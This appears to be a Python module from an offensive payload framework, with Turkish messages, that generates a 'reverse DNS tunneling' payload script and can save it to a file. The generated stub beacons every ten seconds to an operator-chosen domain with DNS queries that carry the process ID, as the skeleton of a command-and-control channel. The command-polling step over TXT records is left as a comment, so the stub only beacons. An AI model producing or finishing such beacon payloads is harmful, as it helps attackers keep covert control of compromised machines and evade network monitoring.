from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    Name = "mahpreter/reverse_dns"
    Description = "Reverse DNS Tunneling Payload."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "DOMAIN": Option("DOMAIN", "example.com", True, "DNS Tunneling için kullanılacak domain."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir=".")
        }

    def generate(self) -> str:
        domain = self.get_option_value("DOMAIN")

        # Python DNS Tunneling Stub (Concept)
        payload = f"""
import socket, subprocess, time, binascii, os

DOMAIN = "{domain}"
ID = os.getpid()

def send_dns_query(subdomain):
    try:
        hostname = f"{{subdomain}}.{{DOMAIN}}"
        # DNS A record query (simulation)
        socket.gethostbyname(hostname)
    except:
        pass

def connect():
    while True:
        # Polling for commands via TXT record would go here
        # For this PoC, we just signal heartbeat
        send_dns_query(f"heartbeat.{{ID}}")
        time.sleep(10)

if __name__ == "__main__":
    connect()
"""
        return payload.strip()

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Mahpreter (DNS) Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
